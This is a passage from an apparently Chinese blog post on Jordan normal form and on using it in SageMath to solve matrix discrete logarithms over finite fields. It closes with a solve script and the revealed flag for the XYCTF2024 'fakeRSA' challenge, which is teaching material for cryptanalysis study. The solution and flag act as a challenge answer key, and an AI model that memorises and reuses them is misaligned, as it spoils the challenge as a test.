inline">\(r[(\lambda_i\pmb{I}-\pmb{A})^{k_i}]=r[(\lambda_i\pmb{I}-\pmb{A})^{k_i+1}]\)</span>的最小正整数</p><p>举个例子，对矩阵<span class="math inline">\(\pmb{A}=\left(\begin{matrix}9&amp;0&amp;-36\\6&amp;0&amp;-27\\0&amp;1&amp;0\end{matrix}\right)\)</span>，求其对应的若尔当标准型：</p><p>第一步，求矩阵<span class="math inline">\(\pmb{A}\)</span>对应的特征值，即解方程<span class="math inline">\(det(\lambda \pmb{I}-A)=0\)</span>，解得唯一解<span class="math inline">\(\lambda=3\)</span>；</p><p>第二步，对唯一特征值<span class="math inline">\(\lambda=3\)</span>，有<span class="math inline">\(3\pmb{I}-\pmb{A}=\left(\begin{matrix}-6&amp;0&amp;36\\ -6&amp;3&amp;27\\0&amp;-1&amp;3\end{matrix}\right)\sim\left(\begin{matrix}1&amp;0&amp;-6\\0&amp;1&amp;-3\\0&amp;0&amp;0\end{matrix}\right)\)</span>，所以其几何重数为<span class="math inline">\(3-r(3\pmb{I}-\pmb{A})=1\)</span>，所以特征值<span class="math inline">\(\lambda=3\)</span>对应的若尔当块的个数为<span class="math inline">\(1\)</span>；</p><p>第三步：对<span class="math inline">\(3\pmb{I}-\pmb{A}\)</span>有<span class="math inline">\(r[(3\pmb{I}-\pmb{A})^1]=2,r[(3\pmb{I}-\pmb{A})^2]=1,r[(3\pmb{I}-\pmb{A})^3]=0,r[(3\pmb{I}-\pmb{A})^4]=0\)</span>，所以该特征值对应的若尔当块的最大阶数为<span class="math inline">\(3\)</span>，所以<span class="math inline">\(\lambda=3\)</span>对应的一个三阶的若尔当块<span class="math inline">\(\pmb{J}(3,3)=\left(\begin{matrix}3&amp;1&amp;0\\0&amp;3&amp;1\\0&amp;0&amp;3\end{matrix}\right)\)</span>或者<span class="math inline">\(\pmb{J}(3,3)=\left(\begin{matrix}3&amp;0&amp;0\\1&amp;3&amp;0\\0&amp;1&amp;3\end{matrix}\right)\)</span>，所以矩阵<span class="math inline">\(\pmb{A}=\left(\begin{matrix}9&amp;0&amp;-36\\6&amp;0&amp;-27\\0&amp;1&amp;0\end{matrix}\right)\)</span>对应的若尔当标准型为<span class="math inline">\(\left(\begin{matrix}3&amp;1&amp;0\\0&amp;3&amp;1\\0&amp;0&amp;3\end{matrix}\right)\)</span>或者<span class="math inline">\(\left(\begin{matrix}3&amp;0&amp;0\\1&amp;3&amp;0\\0&amp;1&amp;3\end{matrix}\right)\)</span>.</p><p>由于本文主要讨论的是通过若尔当标准型求解矩阵的离散对数问题，所以就不再深入介绍若尔当标准型了。</p><p>在这一部分的最后，我们介绍sage中求方阵的若尔当标准型的方法，这个在后面也会用到：</p><p>在sage中有函数<code>jordan_form()</code>，其作用是返回<code>self</code>的若尔当标准型，其函数原型为<code>jordan_form(subdivide=True,transformation=False)</code>，其接收三个参数，分别为一个方阵<code>self</code>，一个布尔型变量<code>subdivide</code>（默认为<code>True</code>），一个布尔型变量<code>transformation</code>（默认为<code>False</code>）。</p><p>若<code>subdivide=True</code>，则返回的矩阵中会根据若尔当块进行分块标出.</p><p>若<code>transformation=True</code>，则会返回一个矩阵组<code>(J,P)</code>，其中<code>J</code>为<code>self</code>的若尔当标准型，而<code>P</code>为使得<span class="math inline">\(self=\pmb{P}\pmb{J}\pmb{P}^{-1}\)</span>成立的方阵；若<code>transformation=False</code>，则只会返回<code>self</code>的若尔当标准型<code>J</code>.</p><p>例：求矩阵<span class="math inline">\(\pmb{A}=\left(\begin{matrix}9&amp;0&amp;-36\\6&amp;0&amp;-27\\0&amp;1&amp;0\end{matrix}\right)\)</span>的若尔当标准型<span class="math inline">\(\pmb{J}\)</span>并求矩阵<span class="math inline">\(\pmb{P}\)</span>使得<span class="math inline">\(\pmb{P}^{-1}\pmb{A}\pmb{P}=\pmb{J}\)</span></p><p>sage代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sage: A = [[9,0,-36],[6,0,-27],[0,1,0]]</span><br><span class="line">sage: J,P = matrix(A).jordan_form(subdivide = False,transformation = True)</span><br><span class="line">sage: J</span><br><span class="line">[3 1 0]</span><br><span class="line">[0 3 1]</span><br><span class="line">[0 0 3]</span><br><span class="line">sage: P</span><br><span class="line">[36  6  1]</span><br><span class="line">[18  6  0]</span><br><span class="line">[ 6  0  0]</span><br><span class="line">sage: P^-1 * matrix(A) * P</span><br><span class="line">[3 1 0]</span><br><span class="line">[0 3 1]</span><br><span class="line">[0 0 3]</span><br></pre></td></tr></table></figure><p>可以得出矩阵<span class="math inline">\(\pmb{A}=\left(\begin{matrix}9&amp;0&amp;-36\\6&amp;0&amp;-27\\0&amp;1&amp;0\end{matrix}\right)\)</span>的若尔当标准型为<span class="math inline">\(\pmb{J}=\left(\begin{matrix}3&amp;1&amp;0\\0&amp;3&amp;1\\0&amp;0&amp;3\end{matrix}\right)\)</span>，且有矩阵<span class="math inline">\(\pmb{P}=\left(\begin{matrix}36&amp;6&amp;1\\18&amp;6&amp;0\\6&amp;0&amp;0\end{matrix}\right)\)</span>使得<span class="math inline">\(\pmb{P}^{-1}\pmb{A}\pmb{P}=\pmb{J}\)</span>.</p><h2 id="第二部分利用若尔当标准型解决矩阵离散对数问题">第二部分：利用若尔当标准型解决矩阵离散对数问题</h2><p>在解决矩阵离散对数问题之前，我们先要了解何谓矩阵离散对数：在有限域<span class="math inline">\(GF(p)\)</span>（<span class="math inline">\(p\)</span>为质数）中，已知<span class="math inline">\(n\)</span>阶矩阵<span class="math inline">\(\pmb{G}\)</span>和<span class="math inline">\(\pmb{H}\)</span>，满足<span class="math inline">\(\pmb{G}^x=\pmb{H}\)</span>，求其中<span class="math inline">\(x\)</span>的问题即为矩阵的离散对数问题.</p><p>由上面的部分我们可以知道，对于矩阵<span class="math inline">\(\pmb{G}\)</span>，存在一个可逆矩阵<span class="math inline">\(\pmb{P}\)</span>使得<span class="math inline">\(\pmb{G}=\pmb{P}\pmb{J}\pmb{P}^{-1}\)</span>，其中矩阵<span class="math inline">\(\pmb{J}\)</span>为<span class="math inline">\(\pmb{G}\)</span>对应的若尔当标准型，那么我们可以知道： <span class="math display">\[\pmb{G}^x=(\pmb{P}\pmb{J}\pmb{P}^{-1})(\pmb{P}\pmb{J}\pmb{P}^{-1})\cdots(\pmb{P}\pmb{J}\pmb{P}^{-1})=\pmb{P}\pmb{J}\pmb{P}^{-1}\pmb{P}\pmb{J}\pmb{P}^{-1}\cdots\pmb{P}\pmb{J}\pmb{P}^{-1}=\pmb{P}\pmb{J}^x\pmb{P}^{-1}\]</span> 其中： <span class="math display">\[\pmb{J}=\left(\begin{matrix}\pmb{J}_1&amp;&amp;&amp;\\&amp;\pmb{J}_2&amp;&amp;\\&amp;&amp;\ddots&amp;\\&amp;&amp;&amp;\pmb{J}_s\end{matrix}\right)\]</span> （<span class="math inline">\(\pmb{J}_1,\pmb{J}_2,\cdots,\pmb{J}_s\)</span>均为若尔当块）</p><p>由于<span class="math inline">\(\pmb{J}\)</span>为准对角矩阵，我们有： <span class="math display">\[\pmb{J}^n=\left(\begin{matrix}\pmb{J}_1&amp;&amp;&amp;\\&amp;\pmb{J}_2&amp;&amp;\\&amp;&amp;\ddots&amp;\\&amp;&amp;&amp;\pmb{J}_s\end{matrix}\right)^n=\left(\begin{matrix}\pmb{J}_1^n&amp;&amp;&amp;\\&amp;\pmb{J}_2^n&amp;&amp;\\&amp;&amp;\ddots&amp;\\&amp;&amp;&amp;\pmb{J}_s^n\end{matrix}\right)\]</span> 对于任意若尔当块 <span class="math display">\[\pmb{J}(\lambda,k)=\left(\begin{matrix}\lambda&amp;1&amp;0&amp;\cdots&amp;0&amp;0&amp;0\\0&amp;\lambda&amp;1&amp;\cdots&amp;0&amp;0&amp;0\\0&amp;0&amp;\lambda&amp;\cdots&amp;0&amp;0&amp;0\\\vdots&amp;\vdots&amp;\vdots&amp; &amp;\vdots&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;\lambda&amp;1\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;\lambda\end{matrix}\right)_{k×k}\]</span> 而若尔当块可以分为两部分： <span class="math display">\[\pmb{J}(\lambda,k)=\pmb{\Lambda}+\pmb{E}=\left(\begin{matrix}\lambda&amp;&amp;&amp;\\&amp;\lambda&amp;&amp;\\&amp;&amp;\ddots&amp;\\&amp;&amp;&amp;\lambda\end{matrix}\right)+\left(\begin{matrix}0&amp;1&amp;0&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;1&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;1\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\end{matrix}\right)\]</span> 所以 <span class="math display">\[\pmb{J}(\lambda,k)^n=(\pmb{\Lambda}+\pmb{E})^n=\sum_{m=0}^{n}\left(\begin{matrix}n\\m\end{matrix}\right)\pmb{\Lambda}^{n-m}\pmb{E}^m\]</span> 而我们很容易可以知道： <span class="math display">\[\pmb{E}=\left(\begin{matrix}0&amp;1&amp;0&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;1&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;1\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\end{matrix}\right),\pmb{E}^2=\left(\begin{matrix}0&amp;0&amp;1&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\end{matrix}\right),\cdots,\pmb{E}^{k-1}=\left(\begin{matrix}0&amp;0&amp;0&amp;\cdots&amp;0&amp;1\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;0\end{matrix}\right),\pmb{E}^k=\pmb{O}\]</span> 所以<span class="math inline">\(\pmb{J}(\lambda,k)^n=\left(\begin{matrix}n\\0\end{matrix}\right)\pmb{\Lambda}^n+\left(\begin{matrix}n\\1\end{matrix}\right)\pmb{\Lambda}^{n-1}\pmb{E}+\cdots+\left(\begin{matrix}n\\k-1\end{matrix}\right)\pmb{\Lambda}^{n-k+1}\pmb{E}^{k-1}\)</span></p><p>可得： <span class="math display">\[\pmb{J}(\lambda,k)^n=\left[\begin{matrix}\lambda^n&amp;n\lambda^{n-1}&amp;\frac{n(n-1)}{2}\lambda^{n-2}&amp;\cdots&amp;\left(\begin{matrix}n\\k-2\end{matrix}\right)\lambda^{n-k+2}&amp;\left(\begin{matrix}n\\k-1\end{matrix}\right)\lambda^{n-k+1}\\0&amp;\lambda^n&amp;n\lambda^{n-1}&amp;\cdots&amp;\left(\begin{matrix}n\\k-3\end{matrix}\right)\lambda^{n-k+3}&amp;\left(\begin{matrix}n\\k-2\end{matrix}\right)\lambda^{n-k+2}\\0&amp;0&amp;\lambda^{n}&amp;\cdots&amp;\left(\begin{matrix}n\\k-4\end{matrix}\right)\lambda^{n-k+4}&amp;\left(\begin{matrix}n\\k-3\end{matrix}\right)\lambda^{n-k+3}\\\vdots&amp;\vdots&amp;\vdots&amp;&amp;\vdots&amp;\vdots\\0&amp;0&amp;0&amp;\cdots&amp;\lambda^{n}&amp;n\lambda^{n-1}\\0&amp;0&amp;0&amp;\cdots&amp;0&amp;\lambda^{n}\end{matrix}\right]\]</span> 对于一般的矩阵离散对数问题，即给出有限域<span class="math inline">\(GF(p)\)</span>下两个矩阵<span class="math inline">\(\pmb{G}\)</span>和<span class="math inline">\(\pmb{H}\)</span>，求满足<span class="math inline">\(\pmb{G}^x=\pmb{H}\)</span>的整数<span class="math inline">\(x\)</span>，我们可以直接对比两个矩阵进行求解即可，大致步骤如下：</p><p>先求<span class="math inline">\(\pmb{G}\)</span>的若尔当标准型<span class="math inline">\(\pmb{J}\)</span>并求可逆矩阵<span class="math inline">\(\pmb{P}\)</span>使得<span class="math inline">\(\pmb{P}^{-1}\pmb{G}\pmb{P}=\pmb{J}\)</span>，由于<span class="math inline">\(\pmb{H}=\pmb{G}^x=(\pmb{P}\pmb{J}\pmb{P}^{-1})^x=\pmb{P}\pmb{J}^{x}\pmb{P}^{-1}\)</span>，所以有<span class="math inline">\(\pmb{P}^{-1}\pmb{H}\pmb{P}=\pmb{J}^x\)</span>，取矩阵<span class="math inline">\(\pmb{J}\)</span>其中一个阶数大于等于<span class="math inline">\(2\)</span>的若尔当块<span class="math inline">\(\pmb{J}(\lambda,k)\)</span>，在矩阵<span class="math inline">\(\pmb{P}^{-1}\pmb{H}\pmb{P}\)</span>取该若尔当块对应区域中最后两行的最后一个元素，实际上就是<span class="math inline">\(\pmb{J}(\lambda,k)^x\)</span>最后两行中的<span class="math inline">\(\lambda^x\)</span>与<span class="math inline">\(x\lambda^{x-1}\)</span>（由上面的矩阵可以得知），从而有： <span class="math display">\[\frac{x\lambda^{x-1}}{\lambda^{x}}\equiv \frac{x}{\lambda}\equiv x\lambda^{-1}\pmod{p}\]</span> 由于我们知道该若尔当块对应的特征值<span class="math inline">\(\lambda\)</span>，所以我们就可以通过乘上一个<span class="math inline">\(\lambda\)</span>求出我们需要的<span class="math inline">\(x\)</span>.</p><p>举个例子，当<span class="math inline">\(p=31\)</span>时，在<span class="math inline">\(GF(p)\)</span>下有矩阵<span class="math inline">\(\pmb{G}=\left(\begin{matrix}17&amp;0&amp;6\\0&amp;3&amp;0\\9&amp;0&amp;18\end{matrix}\right)\)</span>，且有<span class="math inline">\(\pmb{H}=\pmb{G}^x=\left(\begin{matrix}25&amp;0&amp;3\\0&amp;28&amp;0\\20&amp;0&amp;10\end{matrix}\right)\)</span>，求<span class="math inline">\(x\)</span>.</p><p>先求出<span class="math inline">\(\pmb{G}\)</span>的若尔当标准型<span class="math inline">\(\pmb{J}\)</span>及使得<span class="math inline">\(\pmb{P}^{-1}\pmb{G}\pmb{P}=\pmb{J}\)</span>成立的矩阵<span class="math inline">\(\pmb{P}\)</span>如下（此处为了减少篇幅使用sage求两个矩阵）： <span class="math display">\[\pmb{J}=\left(\begin{matrix}3&amp;0&amp;0\\0&amp;2&amp;1\\0&amp;0&amp;2\end{matrix}\right),\pmb{P}= \left(\begin{matrix}0&amp;15&amp;1\\1&amp;0&amp;0\\0&amp;9&amp;0\end{matrix}\right)\]</span> 通过<span class="math inline">\(\pmb{P}\)</span>求出<span class="math inline">\(\pmb{J}^x=\pmb{P}^{-1}\pmb{H}\pmb{P}=\left(\begin{matrix}28&amp;0&amp;0\\0&amp;2&amp;16\\0&amp;0&amp;2\end{matrix}\right)\)</span>，由于<span class="math inline">\(\pmb{J}\)</span>中有一个2阶的若尔当块<span class="math inline">\(\left(\begin{matrix}2&amp;1\\0&amp;2\end{matrix}\right)\)</span>，其对应的<span class="math inline">\(\pmb{G}\)</span>的特征值为<span class="math inline">\(\lambda=2\)</span>，所以取<span class="math inline">\(\pmb{J}^x\)</span>中对应的块<span class="math inline">\(\left(\begin{matrix}2&amp;16\\0&amp;2\end{matrix}\right)\)</span>，有: <span class="math display">\[8\equiv x\lambda^{-1}\pmod{p}\]</span> 两边同乘一个<span class="math inline">\(\lambda=2\)</span>可得<span class="math inline">\(x\equiv16\pmod{31}\)</span>.</p><p>此类矩阵离散对数问题的求解代码模板如下（假设若尔当形矩阵<span class="math inline">\(\pmb{J}\)</span>最右下角一个若尔当块阶数大于<span class="math inline">\(2\)</span>）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">G = []</span><br><span class="line">H = []</span><br><span class="line"></span><br><span class="line">p = </span><br><span class="line">n = <span class="comment">#矩阵的阶数</span></span><br><span class="line"></span><br><span class="line">M_G = matrix(GF(p),G)</span><br><span class="line">M_H = matrix(GF(p),H)</span><br><span class="line"></span><br><span class="line">J, P = M_G.jordan_form(subdivide = <span class="literal">False</span>,transformation = <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">lambda0 = J[n-<span class="number">1</span>][n-<span class="number">1</span>]</span><br><span class="line">M_H_trans = P**-<span class="number">1</span> * M_H * P</span><br><span class="line"></span><br><span class="line">x = lambda0 * M_H_trans[n-<span class="number">2</span>][n-<span class="number">1</span>] * inverse(<span class="built_in">int</span>(M_H_trans[n-<span class="number">1</span>][n-<span class="number">1</span>]),p) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>还有一种类型的矩阵离散对数问题，即为给出<span class="math inline">\(GF(p)\)</span>下的矩阵<span class="math inline">\(\pmb{G}\)</span>及一个初始向量<span class="math inline">\(\pmb{v}\)</span>，且给出<span class="math inline">\(\pmb{y}=\pmb{G}^x\pmb{v}\)</span>，求<span class="math inline">\(x\)</span>.对于这种类型的矩阵离散对数的求解大致步骤如下：</p><p>设<span class="math inline">\(\pmb{v}=\left(v_1,v_2,\cdots,v_n\right)^T,\pmb{y}=\left(y_1,y_2,\cdots,y_n\right)^T\)</span>，求出矩阵<span class="math inline">\(\pmb{G}\)</span>的若尔当标准型<span class="math inline">\(\pmb{J}\)</span>并求可逆矩阵<span class="math inline">\(\pmb{P}\)</span>使得<span class="math inline">\(\pmb{P}^{-1}\pmb{G}\pmb{P}=\pmb{J}\)</span>.为方便解释，在这里我们假定<span class="math inline">\(\pmb{G}\)</span>的若尔当标准型<span class="math inline">\(\pmb{P}\)</span>的最右下角的若尔当块阶数大于等于<span class="math inline">\(2\)</span>（实际上，一个矩阵的若尔当标准型可以通过若尔当块的顺序来变成该矩阵的另外一个若尔当标准型）.</p><p>所以有： <span class="math display">\[\pmb{G}^x\pmb{v}=\pmb{P}\pmb{J}^x\pmb{P}^{-1}\pmb{v}=\pmb{y}\]</span> 设<span class="math inline">\(\pmb{t}=\pmb{P}^{-1}\pmb{v}，\pmb{z}=\pmb{P}^{-1}\pmb{y}\)</span>，就可以得到：<span class="math inline">\(\pmb{P}\pmb{J}^x\pmb{t}=\pmb{P}\pmb{z}\)</span>，而由于矩阵<span class="math inline">\(\pmb{P}\)</span>可逆，则有<span class="math inline">\(\pmb{J}^x\pmb{t}=\pmb{z}\)</span>.</p><p>由于我们已知<span class="math inline">\(\pmb{v}\)</span>及<span class="math inline">\(\pmb{y}\)</span>，所以我们可以通过<span class="math inline">\(\pmb{P}\)</span>求出<span class="math inline">\(\pmb{t}\)</span>及<span class="math inline">\(\pmb{z}\)</span>，在这里我们设<span class="math inline">\(\pmb{t}=\left(t_1,t_2,\cdots,t_n\right)^T,\pmb{z}=\left(z_1,z_2,\cdots,z_n\right)^T\)</span>，由于上面我们假设了<span class="math inline">\(\pmb{J}\)</span>最右下角的若尔当块的阶数大于等于<span class="math inline">\(2\)</span>，在这里我们假设它对应的特征值为<span class="math inline">\(\lambda\)</span>，就可以得出若尔当标准型<span class="math inline">\(\pmb{J}\)</span>最后两行对应的线性关系为： <span class="math display">\[\begin{cases}\lambda^{x}t_{n-1}&amp;+&amp;x\lambda^{x-1}t_n&amp;\equiv&amp;z_{n-1}&amp;\pmod{p}\\&amp;&amp;\lambda^xt_n&amp;\equiv&amp;z_n&amp;\pmod{p}\end{cases}\]</span> 我们可以知道<span class="math inline">\(\lambda^{x}\equiv\frac{z_n}{t_n}\pmod{p}\)</span>，代入第一行的式子可以得到： <span class="math display">\[\frac{z_nt_{n-1}}{t_n}+\frac{xz_n}{\lambda}\equiv z_{n-1}\pmod{p}\]</span> 整理可得： <span class="math display">\[x\equiv\frac{\lambda(z_{n-1}t_n-z_nt_{n-1})}{t_nz_n}\pmod{p}\]</span> 这样我们就可以求出我们要求的<span class="math inline">\(x\)</span>了.</p><p>例如，当<span class="math inline">\(p=31\)</span>时，在<span class="math inline">\(GF(p)\)</span>下有矩阵<span class="math inline">\(\pmb{G}=\left(\begin{matrix}17&amp;0&amp;6\\0&amp;3&amp;0\\9&amp;0&amp;18\end{matrix}\right)\)</span>，且有<span class="math inline">\(\pmb{v}=(1,2,3)^T\)</span>，有<span class="math inline">\(\pmb{G}^x\pmb{v}=\pmb{y}=(13,30,25)^T\)</span>，求<span class="math inline">\(x\)</span>.</p><p>这个矩阵<span class="math inline">\(\pmb{G}\)</span>的若尔当标准型<span class="math inline">\(\pmb{J}\)</span>和对应的矩阵<span class="math inline">\(\pmb{P}\)</span>在上面已经求出，所以这里我们直接搬下来用： <span class="math display">\[\pmb{J}=\left(\begin{matrix}3&amp;0&amp;0\\0&amp;2&amp;1\\0&amp;0&amp;2\end{matrix}\right),\pmb{P}= \left(\begin{matrix}0&amp;15&amp;1\\1&amp;0&amp;0\\0&amp;9&amp;0\end{matrix}\right)\]</span> 所以有<span class="math inline">\(\pmb{t}=\pmb{P}^{-1}\pmb{v}=(2,21,27)^T，\pmb{z}=\pmb{P}^{-1}\pmb{y}=(30,20,23)^T\)</span>，而矩阵<span class="math inline">\(\pmb{J}\)</span>的最右下角的若尔当块对应的特征值<span class="math inline">\(\lambda=2\)</span>，所以有： <span class="math display">\[x\equiv\frac{\lambda(z_{2}t_3-z_3t_{2})}{t_3z_3}\equiv\frac{2\cdot(20\cdot27-23\cdot21)}{27\cdot23}\equiv21\pmod{31}\]</span> 所以可以得出要求的<span class="math inline">\(x = 21\)</span>.</p><p>此类矩阵离散对数问题的求解代码模板如下（假设若尔当形矩阵<span class="math inline">\(\pmb{J}\)</span>最右下角一个若尔当块阶数大于<span class="math inline">\(2\)</span>）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">G = []</span><br><span class="line">V = []</span><br><span class="line">Y = []</span><br><span class="line"></span><br><span class="line">p = <span class="number">31</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">M_G = matrix(GF(p),G)</span><br><span class="line">v = matrix(GF(p),V)</span><br><span class="line">y = matrix(GF(p),Y)</span><br><span class="line"></span><br><span class="line">J, P = M_G.jordan_form(subdivide = <span class="literal">False</span>,transformation = <span class="literal">True</span>)</span><br><span class="line">t = P**-<span class="number">1</span> * v</span><br><span class="line">z = P**-<span class="number">1</span> * y</span><br><span class="line">lambda0 = J[n-<span class="number">1</span>][n-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">x = lambda0 * (t[n-<span class="number">1</span>][<span class="number">0</span>]*z[n-<span class="number">2</span>][<span class="number">0</span>] - t[n-<span class="number">2</span>][<span class="number">0</span>]*z[n-<span class="number">1</span>][<span class="number">0</span>]) * inverse(<span class="built_in">int</span>(t[n-<span class="number">1</span>][<span class="number">0</span>]*z[n-<span class="number">1</span>][<span class="number">0</span>]),p) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p>还有一种特殊情况就是<span class="math inline">\(\pmb{G}^x=\pmb{H}\)</span>中<span class="math inline">\(\pmb{G}\)</span>的若尔当标准型为对角矩阵.这种情况实际上只需要求出<span class="math inline">\(\pmb{G}\)</span>的标准型<span class="math inline">\(\pmb{J}\)</span>与其对应的<span class="math inline">\(\pmb{P}\)</span>之后，通过<span class="math inline">\(\pmb{P}^{-1}\pmb{H}\pmb{P}\)</span>求出<span class="math inline">\(\pmb{J}^x\)</span>，再通过求解整数的离散对数问题的方法求解就行（实际上应该只有这一种方法）.</p><p>下面通过一道题展示一下矩阵离散对数在密码学上的应用：</p><h3 id="xyctf2024fakersa">[XYCTF2024]fakeRSA</h3><p>加密代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;XYCTF&#123;******&#125;&#x27;</span></span><br><span class="line">n = ZZ(bytes_to_long(flag))</span><br><span class="line">p = getPrime(<span class="built_in">int</span>(<span class="number">320</span>))</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line"></span><br><span class="line">G = Zmod(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">function</span>(<span class="params">X, Y, Z</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">part</span>(<span class="params">a, b, c</span>):</span><br><span class="line">        <span class="keyword">return</span> vector([<span class="number">9</span> * a - <span class="number">36</span> * c, <span class="number">6</span> * a - <span class="number">27</span> * c, b])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parts</span>(<span class="params">n</span>):</span><br><span class="line">        Gx.&lt;a, b, c&gt; = G[]</span><br><span class="line">        <span class="keyword">if</span> n == <span class="number">0</span>: <span class="keyword">return</span> vector([a, b, c])</span><br><span class="line">        mid = parts(n // <span class="number">2</span>)</span><br><span class="line">        result = mid(*mid)</span><br><span class="line">        <span class="keyword">if</span> n % <span class="number">2</span> == <span class="number">0</span>: <span class="keyword">return</span> result</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">return</span> part(*result)</span><br><span class="line">    <span class="keyword">return</span> parts(n)(X, Y, Z)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(function(<span class="number">69</span>, <span class="number">48</span>, <span class="number">52</span>))</span><br><span class="line"><span class="comment">#输出数据略</span></span><br></pre></td></tr></table></figure><p>由代码可以看出function的作用是在<span class="math inline">\(GF(p)\)</span>中对向量<span class="math inline">\((X,Y,Z)^T\)</span>进行<span class="math inline">\(n\)</span>次变换<span class="math inline">\((X&#39;,Y&#39;,Z&#39;)^T=(9X-36Z,6X-27Z,Y)^T\)</span>后得到输出的向量，写出变换的矩阵形式如下： <span class="math display">\[\left(\begin{matrix}9&amp;0&amp;-36\\6&amp;0&amp;-27\\0&amp;1&amp;0\end{matrix}\right)\left(\begin{matrix}X\\Y\\Z\end{matrix}\right)=\left(\begin{matrix}X&#39;\\Y&#39;\\Z&#39;\end{matrix}\right)\]</span> 设原向量为<span class="math inline">\((x_1,x_2,x_3)^T\)</span>，最终向量为<span class="math inline">\((y_1,y_2,y_3)^T\)</span>，则有： <span class="math display">\[\left(\begin{matrix}9&amp;0&amp;-36\\6&amp;0&amp;-27\\0&amp;1&amp;0\end{matrix}\right)^n\left(\begin{matrix}x_1\\x_2\\x_3\end{matrix}\right)=\left(\begin{matrix}y_1\\y_2\\y_3\end{matrix}\right)\]</span> 通过上面介绍的方法求解即可得出<span class="math inline">\(n\)</span>，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">G = [[<span class="number">9</span>,<span class="number">0</span>,-<span class="number">36</span>],[<span class="number">6</span>,<span class="number">0</span>,-<span class="number">27</span>],[<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>]]</span><br><span class="line">V = [[<span class="number">69</span>],[<span class="number">48</span>],[<span class="number">52</span>]]</span><br><span class="line">Y = ...<span class="comment">#题目中输出的向量</span></span><br><span class="line"></span><br><span class="line">p = <span class="number">1849790472911267366045392456893126092698743308291512220657006129900961168811898822553602045875909</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">M_G = matrix(GF(p),G)</span><br><span class="line">v = matrix(GF(p),V)</span><br><span class="line">y = matrix(GF(p),Y)</span><br><span class="line"></span><br><span class="line">J, P = M_G.jordan_form(subdivide = <span class="literal">False</span>,transformation = <span class="literal">True</span>)</span><br><span class="line">t = P**-<span class="number">1</span> * v</span><br><span class="line">z = P**-<span class="number">1</span> * y</span><br><span class="line">lambda0 = J[n-<span class="number">1</span>][n-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">x = lambda0 * (t[n-<span class="number">1</span>][<span class="number">0</span>]*z[n-<span class="number">2</span>][<span class="number">0</span>] - t[n-<span class="number">2</span>][<span class="number">0</span>]*z[n-<span class="number">1</span>][<span class="number">0</span>]) * inverse(<span class="built_in">int</span>(t[n-<span class="number">1</span>][<span class="number">0</span>]*z[n-<span class="number">1</span>][<span class="number">0</span>]),p) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(x)))</span><br></pre></td></tr></table></figure><p>运行可得结果：<code>XYCTF&#123;y0u_finally_f0und_t3h_s3cr3ts!!&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> 密码学笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> 高等代数笔记 </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024-疯狂大杂烩！九转功成复现WP</title>
